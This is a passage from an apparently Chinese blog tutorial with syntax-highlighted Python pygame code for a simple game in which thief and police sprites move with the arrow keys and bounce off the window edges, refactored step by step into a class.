punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 移动</span><span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> imageRect  <span class="token comment">#在函数内部可以访问全局变量的值，但不可修改，如要修改需先声明</span>    imageRect <span class="token operator">=</span> imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>    screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>image<span class="token punctuation">,</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、类的创建"><a href="#三、类的创建" class="headerlink" title="三、类的创建"></a>三、类的创建</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，先实例化一个小偷</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、多个对象"><a href="#四、多个对象" class="headerlink" title="四、多个对象"></a>四、多个对象</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、分别控制"><a href="#五、分别控制" class="headerlink" title="五、分别控制"></a>五、分别控制</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token 